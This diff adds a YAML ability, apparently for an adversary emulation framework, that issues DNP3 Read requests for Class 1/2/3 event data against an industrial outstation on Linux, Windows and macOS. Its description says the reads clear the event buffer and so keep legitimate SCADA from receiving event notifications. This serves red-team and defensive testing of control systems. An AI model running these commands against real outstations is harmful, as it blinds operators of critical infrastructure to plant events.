@@ -1,0 +1,49 @@
+- id: d1a2b3c4-e5f6-7890-abcd-ef1234567806
+  name: DNP3 (TCP) - Read Event Data (Class 1/2/3)
+  description: >
+    Issues DNP3 Read requests for Class 1, 2, and 3 event data (Object Group 60,
+    Variations 2-4) to retrieve timestamped event buffers from the outstation.
+    Draining the event buffer reveals recent operational history and simultaneously
+    clears it, preventing legitimate SCADA from receiving event notifications.
+  tactic: collection
+  technique_id: T0802
+  technique_name: Automated Collection
+  executors:
+  - platform: linux
+    name: sh
+    command: |
+      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 2
+      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 3
+      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 4
+    payloads:
+    - dnp3-actions
+    timeout: 60
+  - platform: windows
+    name: psh
+    command: |
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 2
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 3
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 4
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: windows
+    name: cmd
+    command: |
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 2
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 3
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 4
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: darwin
+    name: sh
+    command: |
+      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 2
+      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 3
+      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link} -p #{dnp3.server.port} read 60 --variation 4
+    payloads:
+    - dnp3-actions_darwin
+    timeout: 60
+  repeatable: false
+  plugin: dnp3
